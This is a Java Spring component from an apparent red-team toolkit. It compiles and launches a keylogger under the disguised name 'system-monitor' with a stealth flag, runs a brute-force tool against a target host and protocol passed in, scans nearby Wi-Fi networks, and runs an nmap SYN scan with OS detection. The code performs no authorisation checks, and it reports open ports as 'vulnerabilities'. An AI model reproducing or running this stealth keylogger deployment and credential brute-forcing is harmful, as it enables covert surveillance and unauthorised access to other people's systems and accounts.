package com.codexraziel.cybersec.workflow;

import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;

@Component
@Slf4j
public class RealToolExecutor {
    
    private static final String TOOLS_DIR = "../";
    
    public CompletableFuture<SimpleAttackResult> executeKeylogger() {
        return CompletableFuture.supplyAsync(() -> {
            try {
                String keyloggerPath = TOOLS_DIR + "learning-c-so/linux/system-monitor";
                
                if (!Files.exists(Paths.get(keyloggerPath))) {
                    return compileAndExecuteKeylogger();
                }
                
                ProcessBuilder pb = new ProcessBuilder(keyloggerPath);
                pb.environment().put("STEALTH_MODE", "1");
                Process process = pb.start();
                
                boolean finished = process.waitFor(5, TimeUnit.SECONDS);
                if (finished && process.exitValue() == 0) {
                    return new SimpleAttackResult("keylogger", "Keylogger deployed successfully", true);
                } else {
                    return new SimpleAttackResult("keylogger", "Keylogger deployment timeout", false);
                }
                
            } catch (Exception e) {
                log.error("Keylogger execution failed: {}", e.getMessage());
                return new SimpleAttackResult("keylogger", "Keylogger failed: " + e.getMessage(), false);
            }
        });
    }
    
    private SimpleAttackResult compileAndExecuteKeylogger() {
        try {
            String sourceDir = TOOLS_DIR + "learning-c-so/linux/";
            
            ProcessBuilder compiler = new ProcessBuilder(
                "gcc", "-O3", "-s", "-o", "system-monitor", 
                "linux_stealth_monitor.c", "-lX11", "-lXtst", "-lXext", "-lpthread"
            );
            compiler.directory(new File(sourceDir));
            
            Process compileProcess = compiler.start();
            boolean compiled = compileProcess.waitFor(30, TimeUnit.SECONDS);
            
            if (compiled && compileProcess.exitValue() == 0) {
                ProcessBuilder executor = new ProcessBuilder("./system-monitor");
                executor.directory(new File(sourceDir));
                executor.environment().put("STEALTH_MODE", "1");
                
                Process execProcess = executor.start();
                boolean executed = execProcess.waitFor(5, TimeUnit.SECONDS);
                
                if (executed && execProcess.exitValue() == 0) {
                    return new SimpleAttackResult("keylogger", "Keylogger compiled and deployed", true);
                }
            }
            
            return new SimpleAttackResult("keylogger", "Keylogger compilation failed", false);
            
        } catch (Exception e) {
            log.error("Keylogger compilation failed: {}", e.getMessage());
            return new SimpleAttackResult("keylogger", "Compilation error: " + e.getMessage(), false);
        }
    }
    
    public CompletableFuture<SimpleAttackResult> executeBruteForce(String target, String protocol) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                String bruteforceDir = TOOLS_DIR + "redteam-bruteforce/";
                
                // Compile if needed
                if (!Files.exists(Paths.get(bruteforceDir + "bin/redteam-bf"))) {
                    compileBruteForce(bruteforceDir);
                }
                
                ProcessBuilder pb = new ProcessBuilder(
                    "./bin/redteam-bf", protocol.toLowerCase(), 
                    "--target", target, "--threads", "5", "--timeout", "30"
                );
                pb.directory(new File(bruteforceDir));
                
                Process process = pb.start();
                
                // Capture output
                StringBuilder output = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                        if (output.length() > 1000) break; // Limit output
                    }
                }
                
                boolean finished = process.waitFor(60, TimeUnit.SECONDS);
                if (finished) {
                    String result = output.toString();
                    boolean success = result.contains("SUCCESS") || result.contains("FOUND");
                    return new SimpleAttackResult("bruteforce", 
                        success ? "Attack completed: " + result : "Attack failed: " + result, success);
                } else {
                    process.destroyForcibly();
                    return new SimpleAttackResult("bruteforce", "Attack timeout", false);
                }
                
            } catch (Exception e) {
                log.error("BruteForce execution failed: {}", e.getMessage());
                return new SimpleAttackResult("bruteforce", "BruteForce failed: " + e.getMessage(), false);
            }
        });
    }
    
    private void compileBruteForce(String dir) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("./build/build_all.sh");
        pb.directory(new File(dir));
        Process process = pb.start();
        
        if (!process.waitFor(60, TimeUnit.SECONDS) || process.exitValue() != 0) {
            throw new RuntimeException("BruteForce compilation failed");
        }
    }
    
    public CompletableFuture<SimpleAttackResult> executeWiFiScan(String interfaceName) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                // Try nmcli first (most common)
                ProcessBuilder pb = new ProcessBuilder("nmcli", "dev", "wifi", "list");
                Process process = pb.start();
                
                StringBuilder networks = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 20) {
                        if (line.contains("SSID") || line.trim().isEmpty()) continue;
                        networks.append(line.trim()).append("\n");
                        count++;
                    }
                }
                
                boolean finished = process.waitFor(30, TimeUnit.SECONDS);
                if (finished && process.exitValue() == 0) {
                    String result = networks.toString();
                    int networkCount = result.split("\n").length;
                    return new SimpleAttackResult("wifi_scan", 
                        String.format("Found %d networks:\n%s", networkCount, result), true, result);
                } else {
                    return fallbackWiFiScan(interfaceName);
                }
                
            } catch (Exception e) {
                log.error("WiFi scan failed: {}", e.getMessage());
                return fallbackWiFiScan(interfaceName);
            }
        });
    }
    
    private SimpleAttackResult fallbackWiFiScan(String interfaceName) {
        try {
            // Try iwlist as fallback
            ProcessBuilder pb = new ProcessBuilder("iwlist", interfaceName != null ? interfaceName : "wlan0", "scan");
            Process process = pb.start();
            
            StringBuilder networks = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 50) {
                    if (line.contains("ESSID:") && !line.contains("\"\"")) {
                        String ssid = line.substring(line.indexOf("ESSID:") + 7).replace('"', ' ').trim();
                        networks.append("Network: ").append(ssid).append("\n");
                        count++;
                    }
                }
            }
            
            boolean finished = process.waitFor(30, TimeUnit.SECONDS);
            if (finished && networks.length() > 0) {
                return new SimpleAttackResult("wifi_scan", 
                    "WiFi networks found:\n" + networks.toString(), true, networks.toString());
            } else {
                return new SimpleAttackResult("wifi_scan", "No WiFi networks found or permission denied", false);
            }
            
        } catch (Exception e) {
            log.error("Fallback WiFi scan failed: {}", e.getMessage());
            return new SimpleAttackResult("wifi_scan", "WiFi scan unavailable: " + e.getMessage(), false);
        }
    }
    
    public CompletableFuture<SimpleAttackResult> executeNetworkAnalysis(String target) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                ProcessBuilder pb = new ProcessBuilder("nmap", "-sS", "-O", "--top-ports", "100", target);
                Process process = pb.start();
                
                StringBuilder analysis = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("open") || line.contains("OS:") || line.contains("Service")) {
                            analysis.append(line.trim()).append("\n");
                        }
                    }
                }
                
                boolean finished = process.waitFor(120, TimeUnit.SECONDS);
                if (finished && process.exitValue() == 0) {
                    String result = analysis.toString();
                    boolean hasVulns = result.contains("open") && result.length() > 50;
                    return new SimpleAttackResult("network_analysis", 
                        hasVulns ? "Vulnerabilities found:\n" + result : "Target analysis completed", hasVulns, result);
                } else {
                    return new SimpleAttackResult("network_analysis", "Network analysis timeout or failed", false);
                }
                
            } catch (Exception e) {
                log.error("Network analysis failed: {}", e.getMessage());
                return new SimpleAttackResult("network_analysis", "Analysis failed: " + e.getMessage(), false);
            }
        });
    }
}